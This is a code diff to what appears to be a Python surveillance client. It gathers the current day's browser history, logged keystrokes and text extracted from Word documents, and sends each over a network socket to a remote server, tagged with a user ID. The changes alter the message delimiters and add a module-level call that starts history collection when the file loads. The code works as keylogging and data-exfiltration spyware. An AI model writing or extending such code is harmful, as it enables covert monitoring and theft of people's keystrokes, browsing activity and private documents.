@@ -106,19 +106,18 @@ def get_tabs():
     websites = []
     today = datetime.datetime.today()
     today = today.strftime("%d/%m/%Y")
-
+    
     for tab in his:
         date = tab[0].strftime('%d/%m/%Y')
         if date == today:
             websites.append(tab[1])
     
-    websites = [f"{url} {get_website_title(url)}" for url in websites]
+    websites = [f"{url}  {get_website_title(url)}" for url in websites]
+    websites = ';'.join(websites)
 
-    websites = '#'.join(websites)
-
-    buffer = get_buffer(f"new_websites:{user_id}:{websites}")
+    buffer = get_buffer(f"new_websites>{user_id}>{websites}")
     sock.send(buffer.encode())
-    sock.send(f"new_websites:{user_id}:{websites}".encode())
+    sock.send(f"new_websites>{user_id}>{websites}".encode())
     
 def get_website_title(url):    
     # making requests instance
@@ -138,9 +137,9 @@ def type_trace():
     all_keys = all_keys.replace('shift', '')
     print(all_keys)
 
-    buffer = get_buffer(f"new_keys:{user_id}:{all_keys}")
+    buffer = get_buffer(f"new_text*{user_id}*{all_keys}")
     sock.send(buffer.encode())
-    sock.send(f"new_text:{user_id}:{all_keys}".encode())
+    sock.send(f"new_text*{user_id}*{all_keys}".encode())
 
 def get_word_docs():
     # Initialize an empty list to store the Word documents
@@ -196,9 +195,11 @@ def get_word_text(doc):
     new_words = ' '.join(r.get_ranked_phrases())
     print(new_words)
 
-    buffer = get_buffer(f"new_text:{user_id}:{new_words}")
+    buffer = get_buffer(f"new_text*{user_id}*{new_words}")
     sock.send(buffer.encode())
-    sock.send(f"new_text:{user_id}:{new_words}".encode())
+    sock.send(f"new_text*{user_id}*{new_words}".encode())
+
+get_tabs()
 
 # def task(message):
 #     # report the custom message
